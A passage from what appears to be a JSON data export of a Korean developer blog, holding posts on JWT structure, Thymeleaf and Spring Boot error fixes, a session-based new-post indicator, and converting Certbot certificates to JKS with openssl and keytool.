한장으로 처리됨 (통으로 처리)\n- 그래서 결국 WKHtmlToPdf를 통해 PDF 변환 후 Image 처리를 진행하는 것을 목표로 진행\n\n### 5. XHtml to Pdf (WKHtmlToPDF) (80% 성공)\n\n- [WKHtmlToPdf](https://wkhtmltopdf.org)를 통해서 쉽게 처리\n- 이거를 프로세스로 처리 가능하지만...자바에서도 사용이 가능한 [버전](https://github.com/jhonnymertz/java-wkhtmltopdf-wrapper)을 찾음\n- 물론 **현 시스템에 WKHtmlToPdf가 설치**되어 있어야 한다.\n\n### 6. PDF to Image (Java) (100% 성공)\n\n- 제일 쉬웠다.\n- 이 부분까지 진행하여 결국 Hwp to Image 기능을 완성하였다.\n- 방법은 인터넷에 많이 널려 있다.\n\n<br>\n\n## 그래서 정리하자면?\n\n사실 깔끔하게 Java에서 바로 변환이 되면 좋겠지만...  \n시간이 그렇게 많지 않았고,  \n약간의 성능은 희생을 해도 기능 구현이 완전하게 되는 것을 목표로 하였기에 어찌보면 성공했다고 볼 수 있겠다. **(몹시 주관적)**\n\n나머지는 [2부 포스팅](https://elfinlas.github.io/tools/190125_hwp-image-part2/)에서 다룰 예정이다.  \n또한 각 진행단계에 대한 과정은 아래의 포스팅 리스트를 참고하면 될 듯 하다.\n\n- [Pyhwp 설치하기](https://elfinlas.github.io/tools/190122_installpyhwp/)\n- [WKHtmlPdf 설치하기](https://elfinlas.github.io/tools/190125_install-wkhtmlpdf/)\n- [Pdf를 이미지로 변환](https://elfinlas.github.io/java/190125_java-pdf-img/)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-08-12) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 인증과 토큰 그리고 JWT? 최근들어 보안 및 인증을 위해서 JWT를 사용하게 되었다. 그래서 사용만 하다가 이번에 JWT에 대한 개념과 구조, 사용법과 문제점 등을 알아보고자 한다. 일반 토큰 기반의 인증…","fields":{"slug":"/basic_know/180812_what_is_jwt/"},"frontmatter":{"date":"August 12, 2018","title":"JWT(JSON Web Token) 이란?","description":"JWT에 대하여","tags":["CS","JWT"],"series":"CS","previewImage":"writing-help.png","isPrivate":null},"rawMarkdownBody":"\n\n\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-08-12) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 인증과 토큰 그리고 JWT?\n\n최근들어 보안 및 인증을 위해서 JWT를 사용하게 되었다.  \n그래서 사용만 하다가 이번에 JWT에 대한 개념과 구조, 사용법과 문제점 등을 알아보고자 한다.\n\n<br>\n\n## 일반 토큰 기반의 인증과 클레임(Claim) 토큰 기반 인증\n\n일반 토큰 기반은 과거에 많이 사용하던 방식이다.  \n주로 의미가 없는 문자열(Random string) 기반으로 구성되어 있으며 아래와 같이 표현이 된다.\n\n```\na9ace025c90c0da2161075da6ddd3492a2fca776\n```\n\n그리고 사용할 때는 아래와 같은 json으로 보내는 방식으로 사용하게 됩니다.\n\n```json\n{\n  \"code\": 0,\n  \"msg\": null,\n  \"response\": {\n    \"token\": \"a9ace025c90c0da2161075da6ddd3492a2fca776\",\n    \"now\": 1512446940,\n    \"expired_at\": 1512448740\n  }\n}\n```\n\n그런데 이런 일반 토큰은 단순한 문자열이기 때문에 정보를 담거나 할 수 없다.  \n크게 보자면 아래와 같은 문제점을 가지고 있다.\n\n- 발급된 토큰에 대해서 만료를 시킬 수단이 없다.\n- 발급된 토큰을 검사하거나 처리할 때마다 DB에 접근하여 검사할 경우 부담이 생긴다.\n- 사용자 로그아웃 등으로 인한 토큰을 관리할 수 있는 방법이 없다.\n\n이와 같은 문제를 어느정도 해결할 수 있는 것이 클레임(Claim) 기반 토큰 방식이다.\n\n클레임(Claim)이란 사용자 정보나 데이터 속성 등을 의미한다.  \n그래서 클레임 토큰이라 하면 토큰 안에 저런 정보를 담고 있는 토큰이라 생각하면 된다.  \n예를 들면 아래와 같이 정보를 담고 있는 것을 클레임 기반이라 할 수 있다.\n\n```\n{\n  \"id\":\"mhlab\",\n  \"role\":[\"admin\",\"hr\"],\n  \"company\":\"hexlant\"\n}\n```\n\n이런 클레임을 기반한 토큰 중 가장 대표적인 것이 바로 JWT다.\n\n<br>\n\n## What is JWT?\n\nJWT(Json Web Token)은 위에서 이야기 한 클레임 기반 토큰이며,  \n이름에서 알 수 있는 것처럼 JSON을 이용한 토큰이고 웹 표준(RFC 7519)를 구현한 것이다.  \n자세한 것은 [JWT 공식페이지](https://jwt.io)에서 확인 가능하다.\n\nJWT는 **헤더(header)**, **페이로드(payload)**, **서명(signature)** 세 가지로 나눠져 있으며, 아래와 같은 형태로 구성되어 있다.\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n각 구분은 **.** 구분자로 나눠 표현되며, 각 값은 **BASE64**로 인코딩 되어 있다.\n\n<br>\n\n### Header\n\n헤더에는 **typ**와 **alg** 두 가지 정보로 구성되어 있다.\n\n- typ \\* 토큰의 타입을 지정 (jwt)\n- alg\n  _ 해싱 알고리즘을 지정  \n  _ 주로 HMAC SHA256 또는 RSA를 사용하며 이 알고리즘은 **서명(signature)**에서 사용한다.\n\n헤더 형태는 아래와 같다.\n\n![](/img_01.png)\n\n<br>\n\n### Payload\n\n페이로드라 불리는 부분에는 토큰에서 사용할 정보가 담겨있고 이를 위에서 설명한 클레임이라 부르는 것들이 저장되어 있다.  \nKey/Value 방식으로 이뤄져있으며 (JSON과 유사) 다수의 정보를 넣을 수 있다.  \n이 클레임은 총 세 가지로 나뉜다.\n\n<br>\n\n#### 등록된 클레임 (Registered Claim)\n\n등록된 클레임은 토큰 정보를 표현하기 위해 이미 정해진 데이터 종류이며, 모두 선택적으로 작성 가능하다.  \n종류는 아래와 같다.\n\n- iss: 토큰 발급자 (issuer)\n- sub: 토큰 제목 (subject)\n- aud: 토큰 대상자 (audience)\n- exp: 토큰의 만료시간 (expiraton) \\* NumericDate 형식으로 되어있어야 한다 (Ex: 1480849147370)\n- nbf: 토큰 활성 날짜 \\* 이 날짜가 지나기 전 토큰은 활성화 되지 않는다.\n- iat: 토큰이 발급된 시간 (issued at) \\* 이 값을 사용하여 토큰 발급 이후 얼마나 시간이 지났는지를 알 수 있다.\n- jti: JWT의 고유 식별자 \\* 중복 방지를 위해 사용하며, 일회용 토큰(Access Token 등)에 사용한다.\n\n<br>\n\n#### 공개 클레임 (Public Claim)\n\n공개 클레임은 서로 충돌이 일어나지 않는 이름을 가지고 있어야한다.  \n그래서 **URL** 형태로 작성하며 예시는 아래와 같다.\n\n```\n{ \"https://hexlant.com\": true }\n```\n\n<br>\n\n#### 비공개 클레임 (Private Claim)\n\n비공개 클레임은 실제 사용을 하는 개발자가 지정하는 것으로 서버와 클라이언트가 서로 정의하여 사용하는 클레임을 의미한다.  \n아래와 같이 사용하기도 한다.\n\n```\n{ \"token_type\": \"access\" }\n```\n\n결론적으로 페이로드는 아래와 같이 구성된다.\n\n![](/img_02.png)\n\n<br>\n\n### Signature\n\n서명은 위에서 만든 **Header**와 **Payload** 의 각 값을 **BASE64**로 인코딩 하고,  \n그 값을 비밀키를 이용해 헤더에서 정의한 알고리즘으로 (**HS256**이나 **SHA256** 등) 해싱을 하고,  \n이 값을 다시 BASE64로 인코딩하여 생성한다.\n\n<br>\n\n## JWT Debugger\n\n[JWT 공식 페이지](https://jwt.io)에서는 JWT를 간단하게 디버깅 해볼 수 있는 기능을 제공한다.  \n[이곳](https://jwt.io/#debugger)에서 사용 가능하다.\n\n사이트에서 확인하면 알 수 있는 것처럼 서명에서 키 값을 변경하면 아래의 사진처럼 서명의 **BASE64** 값이 변경되는 것을 확인할 수 있다.\n\n![](/JWT.gif)\n\n<br>\n\n## JWT를 사용할 경우...\n\n위에서 알 수 있는 것처럼 만약 토큰 값을 누군가 수정할 경우 아래의 사진처럼 Debuuger에서 확인할 수 있는 것처럼 변조가 된 것을 확인할 수 있다.\n\n![](/JWT2.gif)\n\n그리고 JWT 토큰 페이로드에는 **BASE64**로 인코딩만 될 뿐 이것을 다시 디코딩하여 정보를 얻을 수 있다.  \n그래서 가급적 토큰에는 **중요 정보**를 담지 않는 것을 추천한다.\n\n<br>\n\n### 정리\n\n이로써 JWT를 알아보았다.  \n다음 포스팅에서는 JWT를 어떤 식으로 활용하는지에 대하여 알아보도록 하겠다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-06-08) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  org.thymeleaf.exceptions.TemplateInputException 발생... Spring Boot의 프로젝트를 진행하던 중 화면을 하나 추가하고 서버를 올린 뒤 해당 뷰로 접근하는 순간…","fields":{"slug":"/thymeleaf/180608_spring-boot-exception-template/"},"frontmatter":{"date":"June 08, 2018","title":"Thymeleaf에서 TemplateInputException 발생의 원인","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-06-08) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# org.thymeleaf.exceptions.TemplateInputException 발생...\n\nSpring Boot의 프로젝트를 진행하던 중 화면을 하나 추가하고 서버를 올린 뒤 해당 뷰로 접근하는 순간...  \n아래와 같은 에러가 발생하였다.\n\n```\n2018-05-28 01:31:59 [ERROR] [TemplateEngine.java]process(1085) : [THYMELEAF][https-jsse-nio-8081-exec-7] Exception processing template \"/views/stat/schedule\": Error resolving template \"/views/stat/schedule\", template might not exist or might not be accessible by any of the configured Template Resolvers\n\n2018-05-28 01:31:59 [ERROR] [DirectJDKLog.java]log(181) : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.thymeleaf.exceptions.TemplateInputException: Error resolving template \"/views/stat/schedule\", template might not exist or might not be accessible by any of the configured Template Resolvers] with root cause\norg.thymeleaf.exceptions.TemplateInputException: Error resolving template \"/views/stat/schedule\", template might not exist or might not be accessible by any of the configured Template Resolvers\n\n```\n\n여기서 **org.thymeleaf.exceptions.TemplateInputException** 이 에러를 보지 못해서 계속 뷰에 뭔가를 잘못 입력했나 싶어서 계속 thymeleaf 화면 파일을 계속 찾다가 도저히 못찾아서 검색해본 결과...\n\n문제는 Controller 영역의 view 화면 지정하는 곳이 문제였다.  \n자세한 것은 아래 코드를 참고!\n\n```java\nModelAndView mv = new ModelAndView();\n//mv.setViewName(\"/views/stat/schedule\"); //뷰 파일 앞에 /를 붙이는게 문제\nmv.setViewName(\"views/stat/schedule\");\n```\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-04-26) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  JS에서 값을 받으려 했더니... SpringBoot를 사용하여 JS에서 Json으로 서버측에 데이터를 보냈더니 아래와 같은 에러가 발생하였습니다. Could not read JSON: Can not de…","fields":{"slug":"/spring_spring-boot/180426_spring-js-start-object-token/"},"frontmatter":{"date":"April 26, 2018","title":"Spring에서 Js에서 데이터 받을 때 START_OBJECT token 에러 문제","description":null,"tags":["Spring"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-04-26) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# JS에서 값을 받으려 했더니...\n\nSpringBoot를 사용하여 JS에서 Json으로 서버측에 데이터를 보냈더니 아래와 같은 에러가 발생하였습니다.\n\n> Could not read JSON: Can not deserialize instance of hello.Country[] out of START_OBJECT token\n\n사실 제 로그는 아니고 검색해서 나온 로그입니다... (저장 해두는 것을 깜빡하여...)\n\n저의 경우 이 문제가 일어난 케이스는 제가 개발 중인 사내정보시스템 기능 중 하나인 회의록 저장 기능이었습니다.  \n먼저 JS 단에서 전송하는 데이터는 아래와 같습니다.\n\n```javascript\njsonObj = {\n  meetingType: $(\"#meetTypeSelector\").val(),\n  startDate: $(\"#startDate\").val(),\n  member: $(\"#userSelector\").val(),\n}\njsonObj.boardDTO = {\n  title: $(\"#title\").val(),\n  content: CKEDITOR.instances.editor1.getData(),\n}\n```\n\n저기 데이터 중에 **member**라는 값은 **Select2**의 값인데 이게 문제였습니다.  \n위의 값을 받는 데이터 중에 DTO를 사용하는데 아래와 같습니다.\n\n```java\n@Getter\n@Setter\n@Accessors(chain = true)\npublic class MeetingLogDTO {\n    private DefaultBoardDTO boardDTO;\n    private MeetingLogType meetingType;\n    private String startDate;\n    private String member; //문제코드\n    //private List<String> member; //수정코드 (정상 동작)\n}\n```\n\n위 코드는 일부 코드이며, 참고용입니다.  \n주석은 제가 수정한 것이고, 기존에는 **String**을 사용하였는데 이 부분이 문제였습니다.  \nJS에서 보낸 **member**의 경우 String으로 오는줄 착각을 하고 있었는데, log를 찍어서 보니...배열로 오고 있었습니다.  \n그래서 이 부분을 String -> List<String> 으로 변환하였더니 문제가 해결 되었습니다.\n\n<br>\n\n## 결론\n\n위 문제가 발생한 경우에는 다음 부분을 확인해 보시기 바랍니다.\n\n**1. JS의 Json 전달 부분의 데이터가 배열인지 일반 문자열인지 확인할 것.**  \n**2. Back-end 부분에서 Json을 받는 부분인 DTO(또는 매핑 객체)의 값의 자료형을 확인해 볼것**\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-04-24) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  오늘의 주제는? 이번 주제는 프로젝트에서 버전을 표시하는 부분을 다루려 합니다. 제가 진행하는 프로젝트는 아래의 사진과 같이 하단에 버전을 표시합니다.  근데 이것을 thymeleaf에서 일일히 버전을 고…","fields":{"slug":"/til/180424_devnote/"},"frontmatter":{"date":"April 24, 2018","title":"<개발일지> 4월 6일 (버전 표시하기 with thymeleaf)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-04-24) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n<br>\n\n# 오늘의 주제는?\n\n이번 주제는 프로젝트에서 버전을 표시하는 부분을 다루려 합니다.\n\n제가 진행하는 프로젝트는 아래의 사진과 같이 하단에 버전을 표시합니다.\n\n![](/img_01.png)\n\n근데 이것을 thymeleaf에서 일일히 버전을 고치는 것은 일입니다.  \n(사실 여기 말고도 JS 등에서 메뉴를 클릭하면 빌드 및 버전 정보가 뜨게 되는 부분도 있어서 이걸 일일히 고치는 것은 심각한 노가다입니다.)\n\n그래서 이번에는 Java의 Enum과 thymeleaf를 활용해서 버전 정보를 관리하는 방법에 대해 포스팅을 해보려 합니다.\n\n<br>\n\n## How to?\n\n진행하는 법을 순서대로 하나씩 진행해보도록 하겠습니다.\n\n<br>\n\n### 1. Java에서 Enum 만들기\n\n먼저 저는 간단한 정보 표시를 위해 enum을 하나 만들었습니다.\n\n```java\npublic enum KeyValue {\n    SERVER_BUILD_VERSION(\"my version~~~~\"),\n    SERVER_VERSION(\"1.0.0\");\n\n    private String value;\n    KeyValue(String value) { this.value = value; }\n    public String getValue() {  return value;  }\n}\n```\n\n<br>\n\n### 2. 정보를 표시할 Thymeleaf에 코드 작성\n\n진행하는 프로젝트는 화면의 구조를 전부 나눠두었기 때문에 footer 부분을 예로 설명 드리겠습니다.\n\n```html\n<footer class=\"main-footer\">\n  <div class=\"pull-right hidden-xs\">\n    <b>Version</b>\n    <span\n      th:text=\"${T(com.mhlab.cb.domain.enums.system.KeyValue).SERVER_VERSION.value}\"\n    ></span>\n  </div>\n</footer>\n```\n\n위 코드에서 보면 **th:text** 부분을 간략하게 설명 드리겠습니다.  \n**T()**라는 키워드를 통해 해당 enum에 접근을 할 수 있는데 괄호 안에는 **(패키지명.사용할 enum)**을 작성하고 **.**으로 접근을 하면 됩니다.\n\n<br>\n\n## 정리\n\n사실 맨 처음에는 노가다 성으로 사용하다가 이걸 개선하려고 구글링을 통해 검색하였고, 가끔 궁금할 때마다 찾게 되는 블로그에서 확인한 내용이었습니다.  \n출처는 [여기](https://blog.outsider.ne.kr/997) 입니다.\n\nthymeleaf를 많이 사용하지 않아서 이런 부분이 익숙하지 않지만 차차 지식을 늘려가봐야겠습니다.\n\n여담으로 슬슬 이직 준비를 하는데 참 쉽지가 않네요 ^^;  \n알고리즘을 손대본지도 오래 되었고, 기본 CS 부분도 다 잊어버려서...  \n네이버나 카카오와 같은 전문 IT 기업으로 이직하고 싶지만... 서류나 시험에서 계속 떨어지니 우울해지네요 ^^;\n\n좀 더 분발해서 제가 원하는 회사로 갔으면 하는 바램이 드는 하루입니다.  \n방문해 주셔서 감사하고, 오신 분들도 다들 잘 되셨으면 합니다 ^^\n\n감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-04-22) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  오늘의 주제는? 간만에 작성하는 연구일지입니다. 정말 많이 바빠서 포스팅도 주말에 시간을 내서 작성하게 되네요. 이번 주제는 게시판에서 새로운 글 작성 시 사이드 메뉴에 표시를 하는 것을 다루겠습니다.  …","fields":{"slug":"/til/180422_devnote/"},"frontmatter":{"date":"April 22, 2018","title":"<개발일지> 4월 5일 연구일지 (게시판에서 새로운 글 작성 표시)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-04-22) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n<br>\n\n# 오늘의 주제는?\n\n간만에 작성하는 연구일지입니다.  \n정말 많이 바빠서 포스팅도 주말에 시간을 내서 작성하게 되네요.\n\n이번 주제는 게시판에서 새로운 글 작성 시 사이드 메뉴에 표시를 하는 것을 다루겠습니다.\n\n![](/img_01.png)\n\n위와 같이 새로운 글이 작성될 경우 옆에 **new**라는 버튼이 뜨게끔 하는 것이 목표입니다.\n\n> 프로젝트 진행 환경은 **Spring Boot**에 **Thymeleaf** 에서 진행하고 있음을 알려드립니다.\n\n<br>\n\n## 어떻게 해야 새 글이라는 것을 알 수 있을까?\n\n먼저 아래와 같은 순서로 구현을 생각해 보았습니다.\n\n1. **새 글이 작성된 기준은 조회 시점 정하기**\n2. **각 게시판에서 새 글이 있는지 알기 위한 체크하는 로직이 필요하다.**\n3. **새 글이 작성되었다는 것을 저장할 곳이 필요하다.**\n4. **새 글이 있는 것을 어디서 조회할 것인가?**\n5. **뷰 단에서 해당 값을 찾아서 있는 경우 표시를 해준다.**\n\n<br>\n\n### 1번 구현법\n\n프로젝트에서는 **하루 전** 작성된 글을 기준으로 하였습니다.  \n이것은 게시판을 저장하는 Repo에서 시간을 조회하는 메서드를 하나 만들었습니다.\n\n`List<Board> findByCreateDateAfter(LocalDateTime localDateTime);`\n\n그리고 조회할 때는 다음과 같이 사용하였습니다.\n\n`boardRepo.findByCreateDateAfter(LocalDateTime.now().minusDays(1))`\n\n<br>\n\n### 2번 구현법\n\n새 글을 알기 위해서는 DB를 조회하여 새로운 값이 있는지, 그리고 있다면 어떤 게시판에 새 글이 있는지를 알기 위한 메서드가 필요했습니다.\n\n```java\n//구형 코드\npublic List<BoardCategory> getUpToDateContents() {\n        List<BoardCategory> list = new ArrayList<>();\n        List<Board> boardList = boardRepo.findByCreateDateAfter(LocalDateTime.now().minusDays(1)).stream()\n                .filter(board -> !board.getCategory().equals(BoardCategory.TEMP_BOARD))\n                .filter(board -> !board.getCategory().equals(BoardCategory.SYSTEM))\n                .collect(Collectors.toList());\n        for(Board board : boardList) { list.add(board.getCategory()); }\n        return list.stream().distinct().collect(Collectors.toList());\n}\n```\n\n게시판을 저장할 때 각 게시판을 위해 **BoardCategory**라는 Enum을 만들어서 저장하였습니다.  \n사실 저 코드는 옛날 코드고 지금은 코드 리펙토링을 통해 불필요한 연산을 줄인 코드를 만들었습니다. (Java8 만세!)\n\n```java\npublic List<BoardCategory> getUpToDateContents() {\n        return boardRepo.findByCreateDateAfter(LocalDateTime.now().minusDays(1)).stream()\n                .filter(board -> !board.getCategory().equals(BoardCategory.TEMP_BOARD))\n                .filter(board -> !board.getCategory().equals(BoardCategory.SYSTEM))\n                .map(Board::getCategory)\n                .distinct()\n                .collect(Collectors.toList());\n}\n```\n\n<br>\n\n### 3번 구현법\n\n저장할 곳은 세션을 사용하였습니다.\n\n```java\npublic static void setSessionDataInNewContents(HttpSession session, List<BoardCategory> categoryList) {\n        session.setAttribute(S_IN_NEW_CONTENTS, categoryList);\n}\n```\n\n위와 같이 작성하여 세션에 저장하였습니다.\n\n<br>\n\n### 4번 구현법\n\n조회를 하는 것은 Controller 단에 로그인 등에서 처음 로그인 시 저장하는 법도 생각하였지만, 만약 세션 타임 아웃 시간이 길 경우 갱신에 대한 문제도 있었습니다.\n\n그래서 인터셉터에서 로그인 이후에 대한 호출하는 곳에서 세션에 저장하는 방법으로 구현을 하였습니다.\n\n```java\n@Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        if(hasSessionInAccount(request.getSession())) {\n            checkAnnotation4ClearSessionInTempData(request,handler);\n            checkUpToDateContents(request);\n\n            return true;\n        }//세션에 계정 정보가 존재하는 경우\n        else {\n            try { response.sendRedirect(\"/users/login\"); }\n            catch (IOException ie ) {} //만약 리다이렉션 도중 에러가 난 경우\n            return false;\n        } //세션 정보가 존재하지 않는 경우\n}\n\n**\n* 새로운 게시글이 있는지 체크하여 세션에 주입하는 메서드\n* @param request\n*/\nprivate void checkUpToDateContents(HttpServletRequest request) {\n        SessionHelper.setSessionDataInNewContents(request.getSession(), boardService.getUpToDateContents());\n}\n```\n\n위 코드를 참고하면 되겠습니다.\n\n<br>\n\n### 5번 구현법\n\n뷰 단에서는 메뉴를 구현한 **Thymeleaf**에서 **th:each**와 **th:if**를 사용하여 구현을 하였습니다.\n\n```html\n<i class=\"fa fa-flag\"></i>\n<span>공지사항</span>\n\n<span\n  class=\"pull-right-container\"\n  th:each=\"category : ${session.NewContents}\"\n  th:object=\"${category}\"\n  th:if=\"${category.toString()} == 'NOTICE'\"\n>\n  <small class=\"label pull-right bg-green\">new</small>\n</span>\n```\n\n위의 thymeleaf의 반복문 내 if문 사용법에 대한 포스팅은 [여기](https://elfinlas.github.io/thymeleaf/180422_thymeleaf-each-if/)를 참고하세요.\n\n<br>\n\n## 결론\n\n위와 같은 방법을 통해서 아래와 같이 기능을 구현하였습니다.\n\n![](/img_02.png)\n\n저와 비슷한 고민을 하셨던 분이 있다면 도움이 되셨으면 합니다.\n\n감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-04-22) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Thymeleaf에서 반복문 안에서 if문 사용하기 Thymeleaf에서 반복문을 사용하는 것은 여기 포스팅에서 다뤘었습니다. 이번에는 반복문 안에서 if문을 사용하여 반복문 안에서 값을 찾은 경우 값을 …","fields":{"slug":"/thymeleaf/180422_thymeleaf-each-if/"},"frontmatter":{"date":"April 22, 2018","title":"Thymeleaf에서 반복문(each) 안에 if문 사용하기","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-04-22) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# Thymeleaf에서 반복문 안에서 if문 사용하기\n\nThymeleaf에서 반복문을 사용하는 것은 [여기](https://elfinlas.github.io/thymeleaf/180218_thymeleaf-loop-index/) 포스팅에서 다뤘었습니다.  \n이번에는 반복문 안에서 if문을 사용하여 반복문 안에서 값을 찾은 경우 값을 표시하는 방법을 다루겠습니다.\n\n```html\n<span\n  class=\"pull-right-container\"\n  th:each=\"[반복문 안의 객체 명] : ${[배열 또는 컬렉션 등의 객체]}\"\n  th:object=\"${[반복문 안의 객체 명]}\"\n  th:if=\"${[조회할 값]}\"\n>\n  <small class=\"label pull-right bg-green\">new</small>\n</span>\n```\n\n위 소스코드는 참고용입니다.  \n하나씩 풀어서 설명을 하겠습니다.\n\n먼저 예로 **span** 태그에 적용을 해본 것이며, 다른 태그에도 적용이 가능합니다.\n\n**th:each**에서 배열 또는 컬렉션 객체를 선언하고 해당 컬렉션 내의 객체를 선언합니다.  \n예를 들면 `List<String> strList = Arrays.asList(\"1\",\"2\",\"3\")` 으로 선언된 것을 사용한다면 다음과 같습니다.\n\n`th:each=\"str : ${strList}\"`\n\n**th:object**에는 위 반복문의 객체, 예시의 str을 넣습니다.\n\n그리고 **th:if**에서 조건을 적어주게 되면 해당 값이 맞을 때 **small**태그가 보여지게 됩니다.\n\n위의 예제에 대한 사용 예를 보시고 싶으시면 [이곳](https://elfinlas.github.io/til/180422_devnote/) 포스팅을 참고하세요.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-03-19) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Certbot으로 만든 인증서 사용하기 전의 포스팅인 Certbot으로 무료 인증서 발급 받기 에서 만든 인증서를 이용해 Spring Boot의 SSL을 적용하는 방법에 대해서 알아보겠습니다. 만약 Cer…","fields":{"slug":"/spring_spring-boot/180319_spring-boot-tls-certbot/"},"frontmatter":{"date":"March 19, 2018","title":"Certbot으로 만든 인증서를 Spring Boot에서 사용하기","description":null,"tags":["Spring Boot","CertBot","LetsEncrypt"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-03-19) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Certbot으로 만든 인증서 사용하기\n\n전의 포스팅인 [Certbot으로 무료 인증서 발급 받기](http://elfinlas.github.io/letsencrypt/180319_certbot-ssl/) 에서 만든 인증서를 이용해 Spring Boot의 SSL을 적용하는 방법에 대해서 알아보겠습니다.\n\n만약 Certbot으로 인증서를 만들지 않으신 분은 위의 포스팅 링크를 참고하여 만들어주시면 됩니다.\n\n<br>\n\n## PEM -> JKS 변환\n\n먼저 Certbot에서 인증서를 생성할 경우 총 4개의 파일이 certbot 경로에 생성되게 됩니다.\n\n다른 설정을 건들지 않았다면 `/etc/letsencrypt/live` 경로 밑에 도메인 이름으로 저장이 됩니다.\n\n만약 **/etc/letsencrypt/**까진 접근이 되지만 live 디렉토리에 접근 시 `-bash: cd: live/: Permission denied` 와 같은 권한 문제를 만날 경우 `sudo su` 등을 통해서 접근합니다.\n\n디렉토리 안에는 총 4개의 pem 파일이 생성되어 있습니다.\n\n- privkey.pem : 개인키\n- fullchain.pem : 내 기본 공개키 + 기타 정보를 포함한 공개 키 (Node Express 서버에서는 option의 cert에 이 파일 사용)\n- cert.pem : 기본 공개키\n- chain.pem : 기타 정보를 포함한 공개키(이것이 없으면 Firefox나 모바일 크롬에서 Https 미적용)\n\n이 파일들을 먼저 알맞은 곳으로 복사를 해줍니다.\n\n<br>\n\n### PKCS12로 변환하기\n\n복사를 하였으면, 해당 디렉토리로 이동 후 **openssl** 명령어를 수행합니다.\n\n```\n> openssl pkcs12 -export -in cert.pem -inkey privkey.pem -out cert_and_key.p12 -name ttp -CAfile chain.pem -caname root\n```\n\n쓰인 속성에 대한 설명은 아래를 참고하세요.\n\n- export : PKCS#12 파일 생성\n- in : 개인키 파일 이름 (p12에 들어갈 인증서)\n- inkey : 포함시킬 개인키\n- out : 생성될 p12 파일명\n- name : Java에서 KeyStore로 접근시 alias항목이 되는 부분 (필수 입력)\n- CAfile : 인증서 발급 체인(CA 인증서 묶음)\n\n<br>\n\n위 명령어를 실행하면 사용할 암호를 입력하는 커맨드가 뜹니다\n\n```\nEnter Export Password:\nVerifying - Enter Export Password:\n```\n\n<br>\n\n### Keytool을 통해 jks 파일 만들기\n\nopenssl 명령어를 통해 **cert_and_key.p12** 파일이 생성되었다면 **keytool**명령어를 통해 jks파일을 만들어줍니다.\n\n> keytool 명령어는 Keystore 기반으로 인증서와 키를 관리할 수 있는 커맨드 유틸리티이며 JDK에 포함되어 있습니다.  \n> openssl과 비슷한 용도로 사용됩니다.\n\n```\n> keytool -importkeystore -deststorepass [사용할 암호] -destkeypass [사용할 암호] -destkeystore [생성할 jks 파일명] -srckeystore 